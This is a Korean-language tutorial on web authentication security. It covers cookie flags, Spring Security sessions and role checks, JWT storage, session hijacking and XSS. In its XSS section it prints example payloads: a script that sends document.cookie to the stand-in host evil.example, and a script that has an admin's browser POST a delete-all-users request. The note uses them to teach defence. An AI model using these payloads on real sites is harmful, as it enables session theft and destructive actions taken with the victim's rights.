# 웹 인증 · 저장소 · 세션 · JWT · XSS · 세션 하이재킹 · Spring Security 권한 판별 

---


## 1. 브라우저 저장소 3종 비교

### 1.1 비교 표

| 구분 | Cookie | LocalStorage | SessionStorage |
|---|---|---|---|
| 저장 위치 | 브라우저 | 브라우저 | 브라우저 |
| 서버 자동 전송 | O | X | X |
| JS 접근 | O (HttpOnly 없으면) | O | O |
| XSS 취약성 | 중 | 매우 높음 | 매우 높음 |
| 인증 저장 적합성 | 조건부 O | ❌ | ❌ |
| 만료 | 설정 가능 | 영구 | 탭 종료 |

핵심:
- **인증 수단(세션ID/토큰)은 서버가 “증거”로 신뢰하는 값**이므로, JS에서 쉽게 읽히면 위험이 커진다.
- LocalStorage/SessionStorage는 **JS로 항상 읽을 수 있으니 XSS에 매우 취약**하다.

---

### 1.2 왜 인증 정보는 Cookie가 정석인가

Cookie는 브라우저가 자동 전송할 수 있고, **HttpOnly**로 JS 접근을 막을 수 있다.

- LocalStorage/SessionStorage:
  - 서버 자동 전송 X → 매 요청마다 개발자가 헤더로 붙여야 함
  - JS 접근 O → XSS 한 번이면 토큰이 바로 탈취됨

---

## 2. Cookie 보안 옵션: HttpOnly / Secure / SameSite

### 2.1 HttpOnly

```http
Set-Cookie: JSESSIONID=abc123; HttpOnly
```

의미:
- JS에서 접근 불가

```js
document.cookie; // HttpOnly 쿠키는 보이지 않음
```

**막는 것**
- XSS로 `document.cookie`를 통해 “세션ID/리프레시토큰”을 **읽어가는 행위**

**못 막는 것**
- XSS 자체
- “피해자 권한으로 요청 보내기” (브라우저는 쿠키를 자동 전송함)

---

### 2.2 Secure

```http
Set-Cookie: JSESSIONID=abc123; Secure
```

의미:
- HTTPS에서만 쿠키 전송
- HTTP 구간에서 스니핑(가로채기) 위험을 줄임

---

### 2.3 SameSite (CSRF 관련)

```http
Set-Cookie: JSESSIONID=abc123; SameSite=Lax
```

의미(요약):
- 다른 사이트에서 유입된 요청에 쿠키를 얼마나 붙일지 제어
- CSRF 방어에 도움

---

## 3. 세션(Session) 인증 구조 (Spring Security 기준)

### 3.1 핵심 개념

- 클라이언트는 **세션ID(JSESSIONID)** 만 보냄
- 실제 사용자/권한은 서버 세션에 저장
- Spring Security는 로그인 성공 시 다음을 만든다:

```text
SecurityContext
 └── Authentication
      ├── principal (UserDetails)
      └── authorities (GrantedAuthority 목록)
```

---

### 3.2 세션 ID(JSESSIONID)의 정체

- 인증 정보 ❌
- 사용자 정보 ❌
- 권한 정보 ❌

정체:
- **서버 세션 저장소에서 세션 객체를 찾기 위한 key(주소)**

```text
JSESSIONID = "세션을 찾아갈 키"
```

따라서 “키만 보고” 권한을 알 수 없고, 서버는 반드시 세션을 조회해야 한다.

---

## 4. 서버는 왜 JSESSIONID를 “세션 키”로 아는가

### 4.1 자동 인식(규약)

- Servlet Specification(표준 규약)에 의해, 기본 세션 쿠키 이름이 `JSESSIONID`로 정해져 있다.
- WAS(Tomcat)는 요청 쿠키에서 `JSESSIONID`를 찾아 세션 조회에 사용한다.
- 추론/해석이 아니라 **약속된 이름 비교**다.

---

### 4.2 세션 쿠키 이름 변경 (Spring Boot)

`application.yml`

```yaml
server:
  servlet:
    session:
      cookie:
        name: MY_SESSION_ID
```

`application.properties`

```properties
server.servlet.session.cookie.name=MY_SESSION_ID
```

---

## 5. Spring Security에서 hasRole()은 무엇을 보는가

### 5.1 결론

`hasRole()`은 “세션/쿠키/JWT를 직접 보지 않는다”.

- **SecurityContext 안의 Authentication**
- 그 안의 **authorities(GrantedAuthority 목록)**

만 본다.

---

### 5.2 hasRole vs hasAuthority

```java
.requestMatchers("/admin/**").hasRole("ADMIN");
```

```java
@PreAuthorize("hasRole('ADMIN')")
```

둘 다 내부적으로:

- `ROLE_ADMIN` 권한이 있는지 확인

규칙:
- `hasRole("ADMIN")` → 실제 비교는 `ROLE_ADMIN`
- `hasAuthority("ROLE_ADMIN")` → 그대로 비교

---

### 5.3 실제 내부 판단(개념 코드)

```java
Authentication auth = SecurityContextHolder.getContext().getAuthentication();

boolean ok = auth.getAuthorities().contains(
    new SimpleGrantedAuthority("ROLE_ADMIN")
);
```

---

## 6. 세션 기반 인증에서 권한이 들어오는 시점 (DB 조회는 언제?)

### 6.1 로그인 시점에 1회 조회

일반적 흐름:

```text
로그인 요청
 → AuthenticationManager
 → UserDetailsService.loadUserByUsername()
 → DB에서 사용자/권한 조회
 → UserDetails(authorities 포함) 반환
 → Authentication 생성
 → SecurityContext 저장
 → HttpSession에 저장
```

---

### 6.2 코드 예시: UserDetailsService

```java
@Override
public UserDetails loadUserByUsername(String username) {
    User user = userRepository.findByUsername(username)
        .orElseThrow(() -> new UsernameNotFoundException(username));

    List<GrantedAuthority> authorities = user.getRoles().stream()
        .map(r -> new SimpleGrantedAuthority("ROLE_" + r.getName()))
        .toList();

    return new org.springframework.security.core.userdetails.User(
        user.getUsername(),
        user.getPassword(),
        authorities
    );
}
```

포인트:
- 여기서 이미 `ROLE_ADMIN` 같은 권한이 authorities에 들어간다.
- 이후 요청에서는 **DB를 재조회하지 않는 것이 기본**이다.

---

### 6.3 이후 요청에서 하는 일(세션)

```text
브라우저 → Cookie(JSESSIONID) 전송
서버 → 세션 저장소에서 HttpSession 조회
     → SPRING_SECURITY_CONTEXT 꺼냄
     → Authentication 꺼냄
     → authorities 검사
     → hasRole 판단
```

---

## 7. 프론트는 무엇을 보내서 서버가 권한을 구분하는가

### 7.1 세션 방식(프론트가 보내는 것)

```http
GET /admin
Cookie: JSESSIONID=XYZ
```

프론트는:
- role을 보내지 않는다
- “내가 ADMIN이다”라고 주장하지 않는다
- 오직 **인증 수단(세션ID)** 만 보낸다

서버는:
- 세션에서 Authentication/authorities를 꺼내 판단

---

### 7.2 JWT 방식(프론트가 보내는 것)

```http
GET /admin
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

프론트는 토큰을 “해석해서 권한 판별”하지 않고,
그냥 전달만 한다. 권한 판별은 서버 책임이다.

---

## 8. “쿠키 값을 바꾸면 접속되는 거 아닌가?”의 정확한 결론

### 8.1 쿠키 값 변경 자체는 공격이 아니다

클라이언트 값은 원래 조작 가능하다.
서버는 “조작 가능”을 전제로 설계한다.

---

### 8.2 접속이 되는 유일한 경우

- 바꾼 값이 **서버에 실제로 존재하는 유효한 세션ID**일 때만 접속된다.

케이스:

| 변경한 JSESSIONID | 결과 |
|---|---|
| 랜덤 값 | 세션 없음 → 401/403 |
| 만료된 값 | 무효 → 재로그인 |
| 내 세션 값 | 정상 |
| 타인의 유효 세션 값 | 접속됨 = 세션 하이재킹 |

즉, 문제는 “변경”이 아니라 “유효한 값 탈취”다.

---

## 9. 세션 하이재킹(Session Hijacking)

정의:
- 타인의 **유효한 세션ID**를 탈취하여 그대로 사용

서버가 막기 어려운 이유:
- 세션 모델은 “세션ID를 가진 자 = 사용자”라는 전제

방어 전략:
- 세션ID 탈취를 막기 (HTTPS, HttpOnly, XSS 방어)
- 탈취되어도 피해 축소 (짧은 TTL, 로그인 시 세션 재발급, 중요 작업 재인증 등)

---

## 10. XSS가 가장 위협적인 이유 (구체 예시)

### 10.1 XSS란

- 공격자가 “피해자의 브라우저 안에서” 스크립트를 실행시키는 공격

---

### 10.2 세션 탈취형 XSS (HttpOnly가 없을 때)

취약한 출력(예: 사용자 입력을 그대로 HTML에 렌더):

```html
<p>안녕하세요 {{username}}</p>
```

공격자 입력:

```html
<script>
  fetch("https://evil.example/steal?c=" + document.cookie);
</script>
```

피해자가 페이지를 열면:
- 브라우저가 스크립트를 실행
- `document.cookie`로 쿠키를 읽어 외부로 전송
- 공격자는 유효한 세션ID를 획득
- 세션 하이재킹 가능

---

### 10.3 행위 실행형 XSS (HttpOnly가 있어도 가능)

HttpOnly면 cookie를 못 읽지만, 피해자 권한으로 요청을 날릴 수 있다:

```html
<script>
  fetch("/admin/delete-all-users", { method: "POST" });
</script>
```

피해자(관리자)가 이 페이지를 열면:
- 브라우저는 쿠키를 자동 포함해서 요청
- 서버는 정상 관리자 요청으로 처리할 수 있음

즉:
- HttpOnly는 “탈취”를 줄이지만
- XSS 자체는 “권한으로 행동”할 수 있어 여전히 위험

---

## 11. JWT도 결국 같은 문제인가?

### 11.1 본질: “탈취되면 끝”은 동일

- 세션: `JSESSIONID` 탈취 → 끝
- JWT: 토큰 문자열 탈취 → 끝

---

### 11.2 차이: 통제(무효화) 가능성

| 항목 | Session | JWT |
|---|---|---|
| 서버 상태 | O | ❌ |
| 즉시 무효화 | 쉬움(invalidate) | 어려움(만료까지 유효) |
| 권한 변경 반영 | 세션 만료 시 | 토큰 만료 시 |

JWT는 “보안이 더 좋다”가 아니라,
**무상태 확장성**을 위해 선택하는 경우가 많다.

---

## 12. JWT 실무 정석 패턴(요약)

잘못된 패턴:
- Access Token을 LocalStorage에 장기 저장 (XSS에 매우 취약)

권장 패턴:
- Access Token: 짧게, 메모리에 보관
- Refresh Token: HttpOnly Cookie에 보관 (단, CSRF 대비 필요)

---

## 13. DB 권한과 세션/JWT의 관계(재조회 여부)

기본 원칙:
- 로그인 시 1회 DB 조회로 authorities 생성
- 이후 요청에서 매번 DB 재조회는 보통 하지 않음 (성능/트래픽)

권한 변경 반영:
- 세션: 세션 만료 전 반영 안 될 수 있음 → 재로그인/강제 로그아웃
- JWT: 토큰 만료 전 반영 어려움 → 짧은 만료 + refresh 전략

---

## 14. 한 줄 요약

- 인증 수단은 “클라이언트가 조작 가능”이 전제이며, 서버는 유효성 검증으로 신뢰를 결정한다.
- hasRole은 세션/토큰을 직접 보지 않고 Authentication.authorities의 ROLE_* 존재 여부로만 판별한다.
- 세션과 JWT 모두 탈취되면 끝이며, 차이는 세션은 즉시 무효화가 쉽고 JWT는 어렵다는 점이다.
- XSS는 브라우저 내부 실행이라 세션 탈취뿐 아니라 권한으로 행위를 실행할 수 있어 가장 위협적이다.
